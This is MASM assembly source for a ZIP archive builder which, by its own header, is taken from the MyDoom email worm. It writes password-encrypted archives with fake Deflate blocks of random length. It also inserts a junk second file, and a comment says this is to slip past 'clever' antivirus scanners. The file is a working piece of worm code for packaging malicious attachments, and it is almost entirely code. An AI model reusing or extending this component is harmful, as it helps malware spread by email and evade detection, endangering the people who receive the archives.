; ZIP file generator
; Based on I-Worm.MyDoom
; #########################################################################

.data?
        RAND_HEAD_LEN           equ     12              ; Length of random encryption header
        keys0                   dd      ?
        keys1                   dd      ?
        keys2                   dd      ?

.data

fake_pack_hdr                   db      00h             ; Usual block
fake_pack_hdrf                  db      01h             ; Final block

; Zip file headers
zip_header_t struct
        signature               DWORD   ?
        ver_needed              WORD    ?
        flags                   WORD    ?
        method                  WORD    ?
        lastmod_time            WORD    ?
        lastmod_date            WORD    ?
        crc                     DWORD   ?
        compressed_size         DWORD   ?
        uncompressed_size       DWORD   ?
        filename_length         WORD    ?
        extra_length            WORD    ?
zip_header_t ends

zip_eod_t struct
        signature               DWORD   ?
        disk_no                 WORD    ?
        disk_dirst              WORD    ?
        disk_dir_entries        WORD    ?
        dir_entries             WORD    ?
        dir_size                DWORD   ?
        dir_offs                DWORD   ?
        comment_len             WORD    ?
zip_eod_t ends

zip_dir_t struct
        signature               DWORD   ?
        made_by                 WORD    ?
        ver_needed              WORD    ?
        flags                   WORD    ?
        method                  WORD    ?
        lastmod_time            WORD    ?
        lastmod_date            WORD    ?
        crc                     DWORD   ?
        compressed_size         DWORD   ?
        uncompressed_size       DWORD   ?
        filename_length         WORD    ?
        extra_length            WORD    ?
        comment_length          WORD    ?
        disk_no                 WORD    ?
        internal_attr           WORD    ?
        external_attr           DWORD   ?
        local_offs              DWORD   ?
zip_dir_t ends

.code

; A part of CRC32 algorithm
CRC32Crypt proc a: DWORD, b: BYTE
        mov     edx, a
        movzx   eax, b
        xor     al, dl
        mov     eax, dword ptr[CRCTable+eax*4]
        shr     edx, 8
        xor     eax, edx
        ret
CRC32Crypt endp

; Update zip encryption keys
ZipUpdateKeys proc V: BYTE
        invoke  CRC32Crypt, keys0, V
        mov     keys0, eax
        and     eax, 0ffh
        add     eax, keys1
        xor     edx, edx
        mov     ecx, 134775813
        mul     ecx
        inc     eax
        mov     keys1, eax
        shr     eax, 24
        invoke  CRC32Crypt, keys2, al
        mov     keys2, eax
        ret
ZipUpdateKeys endp

; Encode a single byte
ZipEncode proc a: BYTE
        mov     ecx, keys2
        and     ecx, 0ffffh
        or      ecx, 2
        mov     eax, ecx
        xor     ecx, 1
        xor     edx, edx
        mul     ecx
        shr     eax, 8
        push    eax
        invoke  ZipUpdateKeys, a
        pop     eax
        xor     al, a
        ret
ZipEncode endp

; Init zip encryption keys
ZipInitKeys proc uses esi passwd: DWORD
        mov     keys0, 305419896
        mov     keys1, 591751049
        mov     keys2, 878082192
        mov     esi, passwd
        lodsb
        .WHILE  al
                invoke  ZipUpdateKeys, al
                lodsb
        .ENDW
        ret
ZipInitKeys endp

; Write crypt header
ZipCryptHead proc uses esi edi passwd, crc, zfile: DWORD
        LOCAL   header[RAND_HEAD_LEN-2]: BYTE ; Random header
        LOCAL   n, bWritten: DWORD
        LOCAL   ztemp: BYTE

        invoke  ZipInitKeys, passwd
        mov     n, 0
        lea     edi, header
        .WHILE  n < RAND_HEAD_LEN-2
                invoke  Rand, 0ffffh
                shr     eax, 7
                invoke  ZipEncode, al
                stosb
                inc     n
        .ENDW
    
        lea     esi, header
        invoke  ZipInitKeys, passwd
        mov     n, 0
        .WHILE  n < RAND_HEAD_LEN-2
                lodsb
                invoke  ZipEncode, al
                mov     ztemp, al
                invoke  WriteFile, zfile, addr ztemp, 1, addr bWritten, NULL
                inc     n
        .ENDW

        mov     eax, crc
        shr     eax, 16
        invoke  ZipEncode, al
        mov     ztemp, al
        invoke  WriteFile, zfile, addr ztemp, 1, addr bWritten, NULL
        
        mov     eax, crc
        shr     eax, 24
        invoke  ZipEncode, al
        mov     ztemp, al
        invoke  WriteFile, zfile, addr ztemp, 1, addr bWritten, NULL
        ret
ZipCryptHead endp

; Encrypt part of dest zfile
ZipCloak proc begin_offs, len, zfile: DWORD
        LOCAL   bTemp: BYTE
        LOCAL   bRead: DWORD

        .IF     !len
                ret
        .ENDIF

        invoke  SetFilePointer, zfile, begin_offs, NULL, FILE_BEGIN

@l:
        invoke  SetFilePointer, zfile, 0, NULL, FILE_CURRENT
        push    eax
        invoke  ReadFile, zfile, addr bTemp, 1, addr bRead, NULL
        pop     eax
        invoke  SetFilePointer, zfile, eax, NULL, FILE_BEGIN
        invoke  ZipEncode, bTemp
        mov     bTemp, al
        invoke  WriteFile, zfile, addr bTemp, 1, addr bRead, NULL
        dec     len
        jnz     @l

        ret
ZipCloak endp

; Convert localtime to ziptime
ZipFilePutTime proc f_time, f_date: DWORD
        LOCAL   systime: SYSTEMTIME

        invoke  GetLocalTime, addr systime

        mov     eax, f_date
        mov     dx, systime.wYear
        sub     dx, 1980
        shl     dx, 9

        mov     cx, systime.wMonth
        shl     cx, 5
        or      cx, systime.wDay
        or      dx, cx
        mov     word ptr[eax], dx

        mov     eax, f_time
        mov     dx, systime.wHour
        shl     dx, 11
        mov     cx, systime.wMinute
        shl     cx, 5
        or      dx, cx
        mov     word ptr[eax], dx
        ret
ZipFilePutTime endp

ZipDumpFile proc uses esi edi hFileIn, hFileOut, StoreName, szPassword, poffs, pdir: DWORD
        LOCAL   bRead, bWritten: DWORD
        LOCAL   offs: DWORD
        LOCAL   hdr1: zip_header_t
        LOCAL   dir1: zip_dir_t
        LOCAL   buf: DWORD
        LOCAL   last_block_offset, crypt_offset: DWORD
        LOCAL   storeas_len: DWORD
        LOCAL   block_len: WORD
        LOCAL   hdr_offs: DWORD

        invoke  SetFilePointer, hFileIn, 0, NULL, FILE_BEGIN

        invoke  GlobalAlloc, GMEM_FIXED, 8192
        mov     buf, eax

        mov     eax, poffs
        m2m     offs, dword ptr[eax]

        m2m     hdr_offs, offs

        invoke  ZeroMemory, addr hdr1, sizeof hdr1
        invoke  ZeroMemory, addr dir1, sizeof dir1

        .IF     szPassword
                or      hdr1.flags, 1
                or      dir1.flags, 1
        .ENDIF

        invoke  lstrlen, StoreName
        mov     storeas_len, eax

        mov     hdr1.signature, 04034b50h
        mov     hdr1.method, 0008h      ; Deflate
        mov     dir1.ver_needed, 10
        m2m     hdr1.ver_needed, dir1.ver_needed
        invoke  ZipFilePutTime, addr hdr1.lastmod_time, addr hdr1.lastmod_date
        m2m     dir1.lastmod_time, hdr1.lastmod_time
        m2m     dir1.lastmod_date, hdr1.lastmod_date
        invoke  CRC32File, hFileIn
        mov     hdr1.crc, eax
        mov     dir1.crc, eax

        m2m     dir1.local_offs, offs

        invoke  GetFileSize, hFileIn, NULL
        mov     hdr1.compressed_size, eax
        mov     dir1.compressed_size, eax
        mov     hdr1.uncompressed_size, eax
        mov     dir1.uncompressed_size, eax

        mov     eax, storeas_len
        mov     hdr1.filename_length, ax
        mov     dir1.filename_length, ax

        mov     eax, storeas_len
        add     offs, eax
        add     offs, sizeof hdr1

        invoke  WriteFile, hFileOut, addr hdr1, sizeof hdr1, addr bWritten, NULL
        invoke  WriteFile, hFileOut, StoreName, storeas_len, addr bWritten, NULL

        .IF     szPassword
                invoke  ZipCryptHead, szPassword, dir1.crc, hFileOut
                add     hdr1.compressed_size, 12 ; size of encryption header
                add     dir1.compressed_size, 12
                add     offs, 12
                invoke  SetFilePointer, hFileOut, 0, NULL, FILE_END
                mov     crypt_offset, eax
        .ENDIF

        ; Write file data
@l:
        ; Gen random block lengths
        invoke  Rand, 200
        add     eax, 20
        xchg    eax, edx
        invoke  ReadFile, hFileIn, buf, edx, addr bRead, NULL
        .IF     bRead
                invoke  SetFilePointer, hFileOut, 0, NULL, FILE_CURRENT
                mov     last_block_offset, eax
                
                ; BTYPE=00
                invoke  WriteFile, hFileOut, offset fake_pack_hdr, 1, addr bWritten, NULL
                
                ; Real block length
                mov     eax, bRead
                mov     block_len, ax
                invoke  WriteFile, hFileOut, addr block_len, 2, addr bWritten, NULL

                ; Complement block length
                not     block_len
                invoke  WriteFile, hFileOut, addr block_len, 2, addr bWritten, NULL

                add     offs, 5
                add     dir1.compressed_size, 5
                add     hdr1.compressed_size, 5

                invoke  WriteFile, hFileOut, buf, bRead, addr bWritten, NULL
                mov     eax, bRead
                add     offs, eax
                jmp     @l
        .ENDIF

        ; Write updated compressed length
        invoke  SetFilePointer, hFileOut, hdr_offs, 0, FILE_BEGIN
        invoke  WriteFile, hFileOut, addr hdr1, sizeof hdr1, addr bWritten, NULL
        
        ; Set last block bit
        invoke  SetFilePointer, hFileOut, last_block_offset, NULL, FILE_BEGIN
        invoke  WriteFile, hFileOut, offset fake_pack_hdrf, 1, addr bWritten, NULL

        ; Encrypt
        .IF     szPassword
                mov     edx, hdr1.compressed_size
                sub     edx, 12 ; sizeof encryption header
                invoke  ZipCloak, crypt_offset, edx, hFileOut
        .ENDIF
        invoke  SetFilePointer, hFileOut, 0, NULL, FILE_END

        mov     dir1.signature,  02014b50h
        mov     dir1.method, 0008h              ; Deflate
        mov     dir1.made_by, 14h               ; MSDOS, PKZIP 2.0
        mov     dir1.ver_needed, 0ah            ; Windows NTFS
        mov     dir1.internal_attr, 1h          ; Apparently an ASCII or text file
        mov     dir1.external_attr, 20h         ; FA_ARCHIVE

        lea     esi, dir1
        mov     edi, pdir
        mov     ecx, sizeof zip_dir_t
        rep movsb

        invoke  GlobalFree, buf

        mov     eax, poffs
        m2m     dword ptr[eax], offs
        ret
ZipDumpFile endp

ZipDumpDir proc hFileOut, dir1, StoreName, poffs: DWORD
        LOCAL   bWritten: DWORD

        invoke  WriteFile, hFileOut, dir1, sizeof zip_dir_t, addr bWritten, NULL

        invoke  lstrlen, StoreName
        mov     ecx, poffs
        add     dword ptr[ecx], eax
        add     dword ptr[ecx], sizeof zip_dir_t
        xchg    eax, edx
        invoke  WriteFile, hFileOut, StoreName, edx, addr bWritten, NULL
        ret
ZipDumpDir endp

; Create ZIP (fake Deflate method: non-packed blocks only), szPassword can be NULL.
; InFile2 (junk file) added to archive to bypass "clever" antiviruses.
CreateZipFile proc uses ebx InFile, InFile2, OutFile, StoreName, StoreName2, szPassword: DWORD
        LOCAL   hFileIn, hFileIn2, hFileOut: DWORD
        LOCAL   bRead, bWritten: DWORD
        LOCAL   offs: DWORD
        LOCAL   eod1: zip_eod_t
        LOCAL   dir1: zip_dir_t
        LOCAL   dir2: zip_dir_t

        xor     ebx, ebx

        invoke  CreateFile, InFile, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL
        mov     hFileIn, eax
        inc     eax
        jz      @czf_ret

        invoke  CreateFile, InFile2, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL
        mov     hFileIn2, eax
        inc     eax
        jz      @czf_ret
        
        invoke  CreateFile, OutFile, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL
        mov     hFileOut, eax
        inc     eax
        jz      @czf_ret

        invoke  ZeroMemory, addr eod1, sizeof eod1

        mov     offs, 0
        invoke  ZipDumpFile, hFileIn, hFileOut, StoreName, szPassword, addr offs, addr dir1
        invoke  ZipDumpFile, hFileIn2, hFileOut, StoreName2, szPassword, addr offs, addr dir2

        m2m     eod1.dir_offs, offs

        invoke  ZipDumpDir, hFileOut, addr dir1, StoreName, addr offs
        invoke  ZipDumpDir, hFileOut, addr dir2, StoreName2, addr offs

        mov     eod1.signature, 06054b50h
        mov     eod1.disk_dir_entries, 2
        m2m     eod1.dir_entries, eod1.disk_dir_entries
        mov     eax, offs
        sub     eax, eod1.dir_offs
        mov     eod1.dir_size, eax
        invoke  WriteFile, hFileOut, addr eod1, sizeof eod1, addr bWritten, NULL

        invoke  CloseHandle, hFileIn2
        invoke  CloseHandle, hFileIn
        invoke  CloseHandle, hFileOut
        inc     ebx

@czf_ret:
        mov     eax, ebx
        ret
CreateZipFile endp
